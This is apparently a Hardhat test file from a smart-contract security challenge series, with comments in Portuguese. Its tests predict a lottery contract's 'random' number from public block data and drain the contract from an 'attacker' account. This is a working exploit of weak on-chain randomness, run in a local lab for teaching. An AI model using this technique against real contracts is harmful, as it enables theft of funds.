const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("GuessTheRandomNumberChallenge", function () {
  let guessChallenge;
  let deployer;
  let attacker;

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();
    
    const GuessTheRandomNumberChallenge = await ethers.getContractFactory(
      "challenges/05_lottery_guess_random_number/contracts/GuessTheRandomNumberChallenge.sol:GuessTheRandomNumberChallenge"
    );
    
    // Deploy com 1 ether (requerido pelo construtor)
    guessChallenge = await GuessTheRandomNumberChallenge.deploy({
      value: ethers.parseEther("1.0")
    });
    await guessChallenge.waitForDeployment();
  });

  describe("Deploy", function () {
    it("Should deploy successfully with 1 ether", async function () {
      const address = await guessChallenge.getAddress();
      expect(address).to.be.properAddress;
      
      const balance = await ethers.provider.getBalance(address);
      expect(balance).to.equal(ethers.parseEther("1.0"));
    });

    it("Should start with challenge incomplete", async function () {
      const isComplete = await guessChallenge.isComplete();
      expect(isComplete).to.be.false;
    });
  });

  describe("Block Data Analysis", function () {
    it("Should be able to read block data used in calculation", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Verificar que podemos ler os dados públicos
      expect(previousBlock.hash).to.not.be.undefined;
      expect(deployBlock.timestamp).to.not.be.undefined;
      expect(previousBlock.number).to.equal(deployBlock.number - 1);
    });

    it("Should demonstrate that block data is public", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Qualquer pessoa pode ler esses dados
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      
      expect(blockHash).to.be.a("string");
      expect(timestamp).to.be.a("number");
    });
  });

  describe("Calculate Random Number", function () {
    it("Should calculate the number using block data", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Calcular o número da mesma forma que o contrato
      // answer = uint8(keccak256(block.blockhash(block.number - 1), now))
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      
      // Em Solidity 0.4.21, keccak256 concatena os argumentos
      const timestampBytes = ethers.zeroPadValue(ethers.toBeHex(timestamp), 32);
      const combined = ethers.concat([blockHash, timestampBytes]);
      const hash = ethers.keccak256(combined);
      
      // Pegar os últimos 8 bits (uint8)
      const calculatedAnswer = parseInt(hash.slice(-2), 16);
      
      expect(calculatedAnswer).to.be.a("number");
      expect(calculatedAnswer).to.be.at.least(0);
      expect(calculatedAnswer).to.be.at.most(255);
    });

    it("Should complete challenge with calculated number", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Calcular o número
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      const timestampBytes = ethers.zeroPadValue(ethers.toBeHex(timestamp), 32);
      const combined = ethers.concat([blockHash, timestampBytes]);
      const hash = ethers.keccak256(combined);
      const calculatedAnswer = parseInt(hash.slice(-2), 16);
      
      // Fazer o guess com o número calculado
      const tx = await guessChallenge.connect(attacker).guess(calculatedAnswer, {
        value: ethers.parseEther("1.0")
      });
      await tx.wait();
      
      // Verificar que o contrato foi drenado
      const balance = await ethers.provider.getBalance(await guessChallenge.getAddress());
      expect(balance).to.equal(0);
      
      // Verificar que o desafio está completo
      expect(await guessChallenge.isComplete()).to.be.true;
    });

    it("Should calculate the same number every time for same block", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Calcular múltiplas vezes
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      const timestampBytes = ethers.zeroPadValue(ethers.toBeHex(timestamp), 32);
      const combined = ethers.concat([blockHash, timestampBytes]);
      const hash = ethers.keccak256(combined);
      const answer1 = parseInt(hash.slice(-2), 16);
      
      // Calcular novamente
      const hash2 = ethers.keccak256(ethers.concat([blockHash, timestampBytes]));
      const answer2 = parseInt(hash2.slice(-2), 16);
      
      // Deve ser o mesmo resultado
      expect(answer1).to.equal(answer2);
    });
  });

  describe("Security - Predictability", function () {
    it("Should demonstrate that block data is predictable", async function () {
      // Obter dados do bloco
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Qualquer pessoa pode calcular o mesmo número
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      const timestampBytes = ethers.zeroPadValue(ethers.toBeHex(timestamp), 32);
      const combined = ethers.concat([blockHash, timestampBytes]);
      const hash = ethers.keccak256(combined);
      const calculatedAnswer = parseInt(hash.slice(-2), 16);
      
      // O número é previsível porque os dados são públicos
      expect(calculatedAnswer).to.be.a("number");
    });

    it("Should verify that miner can influence timestamp", async function () {
      // Em blockchains reais, mineradores podem influenciar o timestamp
      // dentro de limites (geralmente ±15 segundos)
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      
      // Timestamp pode variar ligeiramente, mas ainda é previsível
      expect(deployBlock.timestamp).to.be.a("number");
      expect(deployBlock.timestamp).to.be.greaterThan(0);
    });
  });

  describe("guess() - Correct Answer", function () {
    it("Should complete challenge with correct calculated guess", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Calcular o número
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      const timestampBytes = ethers.zeroPadValue(ethers.toBeHex(timestamp), 32);
      const combined = ethers.concat([blockHash, timestampBytes]);
      const hash = ethers.keccak256(combined);
      const calculatedAnswer = parseInt(hash.slice(-2), 16);
      
      // Fazer o guess
      const tx = await guessChallenge.connect(attacker).guess(calculatedAnswer, {
        value: ethers.parseEther("1.0")
      });
      await tx.wait();
      
      expect(await guessChallenge.isComplete()).to.be.true;
    });

    it("Should transfer 2 ether to attacker on correct guess", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Calcular o número
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      const timestampBytes = ethers.zeroPadValue(ethers.toBeHex(timestamp), 32);
      const combined = ethers.concat([blockHash, timestampBytes]);
      const hash = ethers.keccak256(combined);
      const calculatedAnswer = parseInt(hash.slice(-2), 16);
      
      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
      
      const tx = await guessChallenge.connect(attacker).guess(calculatedAnswer, {
        value: ethers.parseEther("1.0")
      });
      const receipt2 = await tx.wait();
      
      const gasUsed = receipt2.gasUsed * receipt2.gasPrice;
      const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
      const balanceDiff = attackerBalanceAfter - attackerBalanceBefore;
      
      // Deve receber 2 ether, mas pagar 1 ether + gas
      expect(balanceDiff).to.be.greaterThan(ethers.parseEther("0.9"));
    });
  });

  describe("guess() - Wrong Answers", function () {
    it("Should not complete challenge with wrong guess", async function () {
      await guessChallenge.connect(attacker).guess(100, {
        value: ethers.parseEther("1.0")
      });
      
      // O contrato ainda deve ter 2 ether (1 inicial + 1 da tentativa errada)
      const balance = await ethers.provider.getBalance(await guessChallenge.getAddress());
      expect(balance).to.equal(ethers.parseEther("2.0"));
      
      // Desafio não deve estar completo
      expect(await guessChallenge.isComplete()).to.be.false;
    });
  });

  describe("Edge Cases", function () {
    it("Should handle different block numbers correctly", async function () {
      // Verificar que o cálculo funciona para diferentes blocos
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      
      // Verificar que podemos obter o bloco anterior
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      expect(previousBlock).to.not.be.null;
      expect(previousBlock.number).to.equal(deployBlock.number - 1);
    });

    it("Should verify calculation is deterministic", async function () {
      const deployTx = guessChallenge.deploymentTransaction();
      const receipt = await ethers.provider.getTransactionReceipt(deployTx.hash);
      const deployBlock = await ethers.provider.getBlock(receipt.blockNumber);
      const previousBlock = await ethers.provider.getBlock(deployBlock.number - 1);
      
      // Calcular múltiplas vezes com os mesmos dados
      const blockHash = previousBlock.hash;
      const timestamp = deployBlock.timestamp;
      const timestampBytes = ethers.zeroPadValue(ethers.toBeHex(timestamp), 32);
      
      const answers = [];
      for (let i = 0; i < 5; i++) {
        const combined = ethers.concat([blockHash, timestampBytes]);
        const hash = ethers.keccak256(combined);
        const answer = parseInt(hash.slice(-2), 16);
        answers.push(answer);
      }
      
      // Todos devem ser iguais
      expect(answers.every(a => a === answers[0])).to.be.true;
    });
  });
});

